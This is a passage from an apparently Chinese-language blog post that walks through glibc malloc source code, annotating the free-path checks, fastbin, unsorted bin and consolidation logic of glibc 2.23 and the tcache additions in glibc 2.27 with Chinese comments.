&amp;&amp; locked)<br>        (<span class="hljs-type">void</span>) mutex_unlock (&amp;av-&gt;mutex);<br>      malloc_printerr (check_action, errstr, chunk2mem (p), av);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>  <span class="hljs-comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span><br><span class="hljs-comment">     multiple of MALLOC_ALIGNMENT.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))<span class="hljs-comment">//内存块大小&lt;MINSIZE||内存块大小是否符合对其要求</span><br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br><br>  check_inuse_chunk(av, p);<span class="hljs-comment">//检查内存块是否正在使用</span><br></code></pre></td></tr></table></figure><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(get_max_fast ())<span class="hljs-comment">//看是否在fastbin范围内</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> TRIM_FASTBINS</span><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">bordering top into fastbins</span><br><span class="hljs-comment">      */</span><br>         <span class="hljs-comment">/*</span><br><span class="hljs-comment">如果定义了 TRIM_FASTBINS，不要将紧邻 top chunk 的 chunk 放入 fastbins。</span><br><span class="hljs-comment">      */</span><br>      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      ) &#123;<br><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<span class="hljs-comment">//检查洗一个chunk大小是不是&lt;=2*SIZE_SZ</span><br>|| __builtin_expect (chunksize (chunk_at_offset (p, size))<span class="hljs-comment">//或大于分配区总内存</span><br>     &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>      &#123;<br><span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">   of system_mem might have let to a false positive.  Redo the test</span><br><span class="hljs-comment">   after getting the lock.  */</span><br><span class="hljs-keyword">if</span> (have_lock<br>    || (&#123; assert (locked == <span class="hljs-number">0</span>);<span class="hljs-comment">//获取锁，重新检查</span><br>  mutex_lock(&amp;av-&gt;mutex);<br>  locked = <span class="hljs-number">1</span>;<br>  chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ<br>    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;<br>      &#125;))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br><span class="hljs-keyword">if</span> (! have_lock)<span class="hljs-comment">//释放锁</span><br>  &#123;<br>    (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>    locked = <span class="hljs-number">0</span>;<br>  &#125;<br>      &#125;<br><br>    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br><br>    set_fastchunks(av);<span class="hljs-comment">//设置标志，表示分配区中有fastbin</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index(size);<span class="hljs-comment">//根据chunk大小计算对应fastbin索引</span><br>    fb = &amp;fastbin (av, idx);<span class="hljs-comment">//获取分配区第idx个fastbin的指针</span><br><br>    <span class="hljs-comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span><br>     <span class="hljs-comment">//原子操作将chunk插入fastbin</span><br>    mchunkptr old = *fb, old2;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> old_idx = ~<span class="hljs-number">0u</span>;<br>    <span class="hljs-keyword">do</span><br>      &#123;<br><span class="hljs-comment">/* Check that the top of the bin is not the record we are going to add</span><br><span class="hljs-comment">   (i.e., double free).  */</span><br>         <span class="hljs-comment">/* 检查 fastbin 的顶部是否是当前要插入的 chunk（即双重释放）。 */</span><br><span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br><span class="hljs-comment">/* Check that size of fastbin chunk at the top is the same as</span><br><span class="hljs-comment">   size of the chunk that we are adding.  We can dereference OLD</span><br><span class="hljs-comment">   only if we have the lock, otherwise it might have already been</span><br><span class="hljs-comment">   deallocated.  See use of OLD_IDX below for the actual check.  */</span><br>         <span class="hljs-comment">//检查fastbin顶部chunk大小是否与当前chunk大小一致</span><br><span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>  old_idx = fastbin_index(chunksize(old));<br>p-&gt;fd = old2 = old;<br>      &#125;<br>    <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);<br><br>    <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="hljs-number">0</span>))<span class="hljs-comment">//检查fastbin顶部chunk大小</span><br>      &#123;<br>errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h3 id="继续检查"><a href="#继续检查" class="headerlink" title="继续检查"></a>继续检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Consolidate other non-mmapped chunks as they arrive.</span><br><span class="hljs-comment"> */</span><br> <span class="hljs-comment">//检查是否要对非mmap内存块合并</span><br> <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br>   <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>     (<span class="hljs-type">void</span>)mutex_lock(&amp;av-&gt;mutex);<span class="hljs-comment">//尝试获取分配区的锁</span><br>     locked = <span class="hljs-number">1</span>;<br>   &#125;<br><br>   nextchunk = chunk_at_offset(p, size);<span class="hljs-comment">//获取下个chunk地址</span><br><br>   <span class="hljs-comment">/* Lightweight tests: check whether the block is already the</span><br><span class="hljs-comment">      top block.  */</span><br>   <span class="hljs-keyword">if</span> (__glibc_unlikely (p == av-&gt;top))<span class="hljs-comment">//检查当前内存块是不是分配区的topchunk</span><br>     &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br>   <span class="hljs-comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span><br>      <span class="hljs-comment">//检查下个chunk是不是超出分配区的边界</span><br>   <span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av)<br>  &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>  &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (out)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br>   <span class="hljs-comment">/* Or whether the block is actually not marked used.  */</span><br>      <span class="hljs-comment">//检查下个快的‘前一块是否使用标志位’设置没</span><br>   <span class="hljs-keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br><br>      <span class="hljs-comment">//检查下个快的大小（&lt;MINSIZE或&gt;分配区总内存大小）</span><br>   nextsize = chunksize(nextchunk);<br>   <span class="hljs-keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br><br>   free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<span class="hljs-comment">//释放内存块内容</span><br></code></pre></td></tr></table></figure><h3 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br>       <span class="hljs-comment">//向背后那个chunk合并</span><br>    <span class="hljs-keyword">if</span> (!prev_inuse(p)) <span class="hljs-comment">//若前一个chunk空闲，则将当前chunk与前个chunk合并</span><br>    &#123;<br>      prevsize = p-&gt;prev_size;<br>      size += prevsize;<span class="hljs-comment">//更新size</span><br>      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<span class="hljs-comment">//更新当前chunk指针为前一个chunk地址</span><br>      unlink(av, p, bck, fwd);<span class="hljs-comment">//将前个chunk移除链表</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>      <span class="hljs-comment">/* get and clear inuse bit */</span><br>      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<span class="hljs-comment">//获取下个chunk的使用位</span><br><br>      <span class="hljs-comment">/* consolidate forward */</span><br>         <span class="hljs-comment">//向前面的chunk合并</span><br>      <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>unlink(av, nextchunk, bck, fwd);<br>size += nextsize;<br>      &#125; <span class="hljs-keyword">else</span><br>clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h3 id="unsorted-bin-1"><a href="#unsorted-bin-1" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-comment">/*</span><br><span class="hljs-comment">Place the chunk in unsorted chunk list. Chunks are</span><br><span class="hljs-comment">not placed into regular bins until after they have</span><br><span class="hljs-comment">been given one chance to be used in malloc.</span><br><span class="hljs-comment">      */</span><br><br>      bck = unsorted_chunks(av);<span class="hljs-comment">//将chunk放入unsorted bin</span><br>      fwd = bck-&gt;fd;<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<span class="hljs-comment">//检查双向链表有没被破坏</span><br>&#123;<br>  errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>  <span class="hljs-keyword">goto</span> errout;<br>&#125;<br>      <span class="hljs-comment">//将释放的内存块p插入unsorted bin链表</span><br>      p-&gt;fd = fwd;<br>      p-&gt;bk = bck;<br>      <span class="hljs-keyword">if</span> (!in_smallbin_range(size))<span class="hljs-comment">//如果是在largebin范围内就设置特有的两个指针</span><br>&#123;<br>  p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>  p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>&#125;<br>      bck-&gt;fd = p;<br>      fwd-&gt;bk = p;<br><br>      set_head(p, size | PREV_INUSE);<br>      set_foot(p, size);<span class="hljs-comment">//设置头，脚部信息</span><br><br>      check_free_chunk(av, p);<span class="hljs-comment">//检查内存块状态</span><br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">      consolidate into top</span><br><span class="hljs-comment">    */</span><br><span class="hljs-comment">//如果内存块与top chunk相邻，就合并到top chunk</span><br>    <span class="hljs-keyword">else</span> &#123;<br>      size += nextsize;<br>      set_head(p, size | PREV_INUSE);<br>      av-&gt;top = p;<br>      check_chunk(av, p);<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="整理堆"><a href="#整理堆" class="headerlink" title="整理堆"></a>整理堆</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If freeing a large space, consolidate possibly-surrounding</span><br><span class="hljs-comment">      chunks. Then, if the total unused topmost memory exceeds trim</span><br><span class="hljs-comment">      threshold, ask malloc_trim to reduce top.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span><br><span class="hljs-comment">      bordering top, so we cannot tell for sure whether threshold</span><br><span class="hljs-comment">      has been reached unless fastbins are consolidated.  But we</span><br><span class="hljs-comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span><br><span class="hljs-comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span><br><span class="hljs-comment">      is reached.</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) <span class="hljs-comment">//当前释放的大小超过FASTBIN_CONSOLIDATION_THRESHOLD进入分支</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>malloc_consolidate(av);<span class="hljs-comment">//合并fastbin中内存块</span><br><br>      <span class="hljs-keyword">if</span> (av == &amp;main_arena)<span class="hljs-comment">//看是否要修剪top chunk </span><br>      &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(chunksize(av-&gt;top)) &gt;=<br>    (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(mp_.trim_threshold))<span class="hljs-comment">//看top chunk是不是超过了修剪阈值</span><br>  systrim(mp_.top_pad, av);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      &#125; <span class="hljs-keyword">else</span><span class="hljs-comment">//对于非主分配区 </span><br>      &#123;<br><span class="hljs-comment">/* Always try heap_trim(), even if the top chunk is not</span><br><span class="hljs-comment">   large, because the corresponding heap might go away.  */</span><br>           <span class="hljs-comment">/* 即使顶部块不大，也尝试调用 heap_trim()，因为对应的堆可能会被释放。 */</span><br>heap_info *heap = heap_for_ptr(top(av));<br><br>assert(heap-&gt;ar_ptr == av);<br>heap_trim(heap, mp_.top_pad);<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>      assert (locked);<br>      (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>    &#125;<span class="hljs-comment">//释放锁</span><br>  &#125;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    If the chunk was allocated via mmap, release via munmap().</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-keyword">else</span> &#123;<br>    munmap_chunk (p);<br>  &#125;<span class="hljs-comment">//释放由mmap分配的内存</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc-2.27"></a>glibc-2.27</h1><h2 id="libc-malloc-1"><a href="#libc-malloc-1" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim;<br><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<span class="hljs-comment">//钩子函数</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE<span class="hljs-comment">//编译时宏，用于启用线程缓存机制</span></span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-type">size_t</span> tbytes;<br>  checked_request2size (bytes, tbytes);<span class="hljs-comment">//将请求大小转换为实际分配的大小</span><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (tbytes);<br><br>  MAYBE_INIT_TCACHE ();<br><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<span class="hljs-comment">//单线程</span><br>    &#123;<br>      victim = _int_malloc (&amp;main_arena, bytes);<br>      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));<br>      <span class="hljs-keyword">return</span> victim;<br>    &#125;<br><br>  arena_get (ar_ptr, bytes);<span class="hljs-comment">//多线程</span><br><br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-keyword">return</span> victim;<br>&#125;<br>libc_hidden_def (__libc_malloc)<br></code></pre></td></tr></table></figure><p>可以看到与2.23相比最大的变化就是多了teache，下面就来详细地看一下这一部分的源码</p><h2 id="teache"><a href="#teache" class="headerlink" title="teache"></a>teache</h2><h3 id="teache结构体"><a href="#teache结构体" class="headerlink" title="teache结构体"></a>teache结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><br><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-comment">/* 当一个内存块（chunk）存储在线程本地缓存（per-thread cache）中时，</span><br><span class="hljs-comment">   我们将这个结构体覆盖在内存块的用户数据部分。 */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span>//用于管理空闲<span class="hljs-title">chunk</span>的结构体</span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><span class="hljs-comment">//指向下一个空闲chunk</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-comment">/* 每个线程都有一个这样的结构体，它包含了线程本地缓存</span><br><span class="hljs-comment">   （因此命名为 &quot;tcache_perthread_struct&quot;）。保持整体大小较小是较为重要的。</span><br><span class="hljs-comment">   注意，COUNTS 和 ENTRIES 是冗余的（我们本可以每次都遍历链表来计数），</span><br><span class="hljs-comment">   这是出于性能考虑。 */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span>//每个线程的<span class="hljs-title">teache</span>数据结构</span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<span class="hljs-comment">//记录每个bin中空闲chunk数量，TCACHE_MAX_BINS：tcache中最大bin数量</span><br>  tcache_entry *entries[TCACHE_MAX_BINS];<span class="hljs-comment">//每个元素是指向tcache_entry链表的指针</span><br>&#125; tcache_perthread_struct;<br><br><span class="hljs-type">static</span> __thread <span class="hljs-type">bool</span> tcache_shutting_down = <span class="hljs-literal">false</span>;<span class="hljs-comment">//用于标记当前线程的tcache是否正在关闭，初始false</span><br><span class="hljs-type">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<span class="hljs-comment">//tcache的核心数据结构，存储当前线程的所有缓存信息，初始值NULL，表示tcache未初始化</span><br></code></pre></td></tr></table></figure><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-comment">/* 调用者必须确保 tc_idx 是有效的，并且有空间存放更多的内存块。 */</span>   <span class="hljs-comment">//用于将内存块放入tcache</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><span 